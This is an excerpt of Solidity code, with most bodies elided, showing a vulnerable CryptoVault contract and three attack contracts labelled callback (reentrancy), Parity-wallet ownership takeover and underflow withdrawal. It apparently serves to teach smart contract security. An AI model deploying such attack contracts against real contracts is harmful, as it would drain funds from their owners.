...
contract CryptoVault {
    ...
    function withdrawAll() public {
        ...
        require(send, "Failed to send funds");
...
contract CallbackAttack {
    ...
    constructor(address payable d) public { dao = CryptoVault(d); }
...
contract ParityWalletAttack {
    ...
    function attack (address ai) public {
        (bool success,) = ai.call(abi.encodeWithSignature("init(address)",address(this)));
        require(success,"init failed");
        (success,) = ai.call(abi.encodeWithSignature("collectFees()"));
        require(success,"collectFees failed");
    }
...
contract UnderflowAttack{
    ...
    constructor(address payable _d) public { d = CryptoVault(_d); }

    function attack () public payable{
        d.deposit{value: msg.value}();
        d.withdraw(msg.value + 1);
    }
